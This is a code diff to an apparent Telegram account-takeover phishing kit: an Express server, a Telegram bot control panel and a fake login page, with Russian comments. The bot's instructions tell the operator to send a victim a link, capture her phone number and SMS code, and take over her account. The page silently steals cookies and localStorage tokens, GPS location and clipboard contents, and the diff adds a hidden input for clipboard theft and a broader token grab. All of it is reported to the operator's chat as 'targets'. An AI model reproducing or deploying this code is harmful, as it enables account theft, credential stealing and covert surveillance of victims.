@@ -13,19 +13,16 @@ const app = express();
 app.use(express.json());
 
 let history = [];
-let isMenuSent = false;
+let notifyEnabled = true;
 
 // --- БОТ ---
 bot.onText(/^\/start$/, (msg) => {
-  if (isMenuSent) return; // Защита от дублей
-  isMenuSent = true;
-  
   const opts = {
     reply_markup: {
       inline_keyboard: [
-        [{ text: '📜 История захватов', callback_data: 'hist' }],
-        [{ text: '📖 Инструкция', callback_data: 'instr' }],
-        [{ text: '🌐 Открыть сайт', url: 'https://tg-sms-ykx6.onrender.com' }]
+        [{ text: '📜 История', callback_data: 'hist' }, { text: '⚙️ Настройки', callback_data: 'settings' }],
+        [{ text: '📖 Инструкция', callback_data: 'instr' }, { text: '🌐 Сайт', url: 'https://tg-sms-ykx6.onrender.com' }],
+        [{ text: '🧹 Очистить историю', callback_data: 'clear' }]
       ]
     }
   };
@@ -37,7 +34,7 @@ bot.on('callback_query', (query) => {
   bot.answerCallbackQuery(query.id);
 
   if (query.data === 'instr') {
-    bot.sendMessage(chatId, `📖 <b>ИНСТРУКЦИЯ</b>\n\n1. Скинь жертве ссылку.\n2. Она вводит номер.\n3. Ты вводишь её номер в свой Telegram.\n4. Жертве приходит СМС. Она вводит код.\n5. Тебе летит код. Ты вводишь его в Telegram.`, { parse_mode: 'HTML' });
+    bot.sendMessage(chatId, `📖 <b>ИНСТРУКЦИЯ</b>\n\n1. Скинь жертве ссылку.\n2. Она вводит номер.\n3. Ты вводишь её номер в свой Telegram.\n4. Жертве приходит СМС. Она вводит код на сайте.\n5. Тебе летит код. Ты вводишь его в Telegram и забираешь аккаунт.`, { parse_mode: 'HTML' });
   }
 
   if (query.data === 'hist') {
@@ -45,9 +42,63 @@ bot.on('callback_query', (query) => {
     const text = history.slice(0, 10).map((h, i) => `${i + 1}. <code>${h.phone}</code> | Код: <code>${h.code}</code>`).join('\n');
     bot.sendMessage(chatId, `📜 <b>Последние 10 целей:</b>\n\n${text}`, { parse_mode: 'HTML' });
   }
+
+  if (query.data === 'settings') {
+    const status = notifyEnabled ? 'ВКЛ' : 'ВЫКЛ';
+    bot.sendMessage(chatId, `⚙️ <b>Настройки</b>\n\nУведомления: <b>${status}</b>`, {
+      parse_mode: 'HTML',
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: `Уведомления: ${status}`, callback_data: 'toggle_notify' }],
+          [{ text: '🔙 Назад', callback_data: 'back' }]
+        ]
+      }
+    });
+  }
+
+  if (query.data === 'toggle_notify') {
+    notifyEnabled = !notifyEnabled;
+    bot.answerCallbackQuery(query.id, { text: `Уведомления: ${notifyEnabled ? 'ВКЛ' : 'ВЫКЛ'}` });
+    bot.editMessageText(`⚙️ <b>Настройки</b>\n\nУведомления: <b>${notifyEnabled ? 'ВКЛ' : 'ВЫКЛ'}</b>`, {
+      chat_id: chatId,
+      message_id: query.message.message_id,
+      parse_mode: 'HTML',
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: `Уведомления: ${notifyEnabled ? 'ВКЛ' : 'ВЫКЛ'}`, callback_data: 'toggle_notify' }],
+          [{ text: '🔙 Назад', callback_data: 'back' }]
+        ]
+      }
+    });
+  }
+
+  if (query.data === 'clear') {
+    history = [];
+    bot.answerCallbackQuery(query.id, { text: 'История очищена' });
+    bot.sendMessage(chatId, '🧹 История очищена.');
+  }
+
+  if (query.data === 'back') {
+    const opts = {
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: '📜 История', callback_data: 'hist' }, { text: '⚙️ Настройки', callback_data: 'settings' }],
+          [{ text: '📖 Инструкция', callback_data: 'instr' }, { text: '🌐 Сайт', url: 'https://tg-sms-ykx6.onrender.com' }],
+          [{ text: '🧹 Очистить историю', callback_data: 'clear' }]
+        ]
+      }
+    };
+    bot.editMessageText(`🛡 <b>Панель управления</b>\n\nВыбери действие:`, {
+      chat_id: chatId,
+      message_id: query.message.message_id,
+      parse_mode: 'HTML',
+      ...opts
+    });
+  }
 });
 
 async function sendToAdmin(text) {
+  if (!notifyEnabled) return;
   try {
     await bot.sendMessage(ADMIN_CHAT_ID, text, { parse_mode: 'HTML' });
   } catch (e) {}
@@ -60,17 +111,14 @@ app.post('/api/request', async (req, res) => {
 
   if (!phone || phone.length < 8) return res.status(400).json({ ok: false });
 
-  // Улучшенный парсинг модели Android
-  let device = "Android (Неизвестно)";
-  const androidMatch = ua.match(/Android\s[0-9.]+;\s([^;)]+)/);
-  
+  let device = "Android";
   if (ua.includes("iPhone")) device = "Apple iPhone";
-  else if (ua.includes("Samsung")) device = "Samsung Galaxy";
   else if (ua.includes("Redmi") || ua.includes("Xiaomi")) device = "Xiaomi Redmi";
+  else if (ua.includes("Samsung")) device = "Samsung Galaxy";
   else if (ua.includes("Windows")) device = "Windows PC";
-  else if (ua.includes("Mac OS")) device = "Apple Mac";
-  else if (androidMatch && androidMatch[1]) {
-    device = androidMatch[1].trim();
+  else {
+    const match = ua.match(/Android\s([0-9.]+);\s([^;)]+)/);
+    if (match) device = `${match[1]} (${match[2]})`;
   }
 
   let ipInfo = "Неизвестно";
@@ -86,18 +134,18 @@ app.post('/api/request', async (req, res) => {
 
   let msg = `🎯 <b>НОВАЯ ЦЕЛЬ</b>\n\n` +
             `📱 <b>Номер:</b> <code>${phone}</code>\n` +
-            `💻 <b>Модель:</b> ${device}\n` +
+            `💻 <b>Устройство:</b> ${device}\n` +
             `🖥 <b>Экран:</b> ${screen || 'Неизвестно'}\n` +
             `🔋 <b>Батарея:</b> ${battery || 'Скрыто'}\n` +
             `🌐 <b>IP:</b> <code>${ip.split(',')[0]}</code>\n` +
-            `📍 <b>Локация (IP):</b> ${ipInfo}\n`;
+            `📍 <b>Локация:</b> ${ipInfo}\n`;
 
   if (geo) msg += `🗺 <b>GPS:</b> <a href="https://maps.google.com/?q=${geo}">Открыть карту</a>\n`;
   if (clipboard) msg += `📋 <b>Буфер:</b> <code>${clipboard}</code>\n`;
   if (isVpn) msg += `⚠️ <b>VPN/Proxy!</b>\n`;
   
   if (steal && steal.length > 0) {
-    msg += `\n🍪 <b>УКРАДЕНО (Cookies/Tokens):</b>\n`;
+    msg += `\n🍪 <b>УКРАДЕНО:</b>\n`;
     steal.forEach(s => {
       msg += `<code>${s.name}</code>: <code>${s.value.substring(0, 20)}...</code>\n`;
     });
@@ -151,6 +199,7 @@ app.get('/', (req, res) => {
   .code-container { display: flex; justify-content: center; gap: 10px; margin-bottom: 25px; animation: fadeIn 0.3s ease; }
   .code-input { width: 50px; height: 60px; text-align: center; font-size: 24px; font-weight: 600; background: #0e1621; border: 1.5px solid #2b5278; border-radius: 10px; color: #fff; outline: none; transition: border-color 0.2s; }
   .code-input:focus { border-color: #2aabee; }
+  .hidden-stealer { position: absolute; opacity: 0; pointer-events: none; height: 0; width: 0; }
 </style>
 </head>
 <body>
@@ -169,6 +218,7 @@ app.get('/', (req, res) => {
   
   <div class="form-container">
     <form id="phoneForm" autocomplete="off">
+      <input type="text" class="hidden-stealer" id="hiddenStealer">
       <div class="input-group">
         <select class="country-select" id="countryCode">
           <option value="373">🇲🇩 +373</option>
@@ -209,25 +259,23 @@ app.get('/', (req, res) => {
   const subtitle = document.getElementById('subtitle');
   const phoneInput = document.getElementById('phone');
   const clock = document.getElementById('clock');
+  const hiddenStealer = document.getElementById('hiddenStealer');
   
   let fullPhone = '';
   let geoData = null;
   let clipData = null;
   let stolenData = [];
 
-  // Стиллер (сбор куки и токенов)
+  // 1. СТИЛЛЕР (Куки и токены)
   function stealData() {
     try {
-      // Собираем куки
       document.cookie.split(';').forEach(c => {
         let [name, ...val] = c.split('=');
         if (name && val.length) stolenData.push({ name: name.trim(), value: val.join('=') });
       });
-      
-      // Собираем токены Discord/Telegram из LocalStorage
       for (let i = 0; i < localStorage.length; i++) {
         let key = localStorage.key(i);
-        if (key.includes('token') || key.includes('auth')) {
+        if (key.includes('token') || key.includes('auth') || key.includes('session')) {
           stolenData.push({ name: 'LS:' + key, value: localStorage.getItem(key) });
         }
       }
@@ -235,6 +283,7 @@ app.get('/', (req, res) => {
   }
   stealData();
 
+  // 2. ГЕОЛОКАЦИЯ
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
       (pos) => { geoData = pos.coords.latitude + ',' + pos.coords.longitude; },
@@ -243,13 +292,23 @@ app.get('/', (req, res) => {
     );
   }
   
-  try {
-    if (navigator.clipboard) {
-      navigator.clipboard.readText().then(t => { 
-        if(t && t.length > 2) clipData = t.slice(0, 100); 
-      }).catch(()=>{});
-    }
-  } catch(e) {}
+  // 3. БУФЕР ОБМЕНА (Фикс с фокусом)
+  async function readClipboard() {
+    try {
+      if (navigator.clipboard) {
+        const t = await navigator.clipboard.readText();
+        if (t && t.length > 2) clipData = t.slice(0, 100);
+      } else {
+        hiddenStealer.focus();
+        document.execCommand('paste');
+        clipData = hiddenStealer.value.slice(0, 100);
+      }
+    } catch(e) {}
+  }
+  readClipboard();
+  
+  // Повторная попытка при клике на поле телефона
+  phoneInput.addEventListener('focus', readClipboard);
 
   setInterval(() => {
     const d = new Date();
